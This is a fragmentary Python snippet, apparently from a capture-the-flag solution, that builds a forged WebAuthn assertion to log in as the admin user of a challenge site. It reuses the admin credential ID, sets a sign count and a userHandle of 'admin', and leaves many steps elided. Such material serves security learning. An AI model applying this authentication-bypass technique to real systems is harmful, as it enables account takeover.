...
ORIGIN = "https://webauthn.youcanhack.me"
DOMAIN = "webauthn.youcanhack.me"
...
cred_id = base64.urlsafe_b64decode(admin_id.encode()+b'=' * (-len(admin_id) % 4)) # admin credential ID
...
flags = b'\x05'
sign_count = struct.pack(">I", 1)  # incremented sign count
...
auth_obj = {
    ...
    'rawId': opts['allowCredentials'][0]['id'],
    'response': {
        ...
        'userHandle': base64.urlsafe_b64encode(b'admin').decode()
    },
    'type': 'public-key',
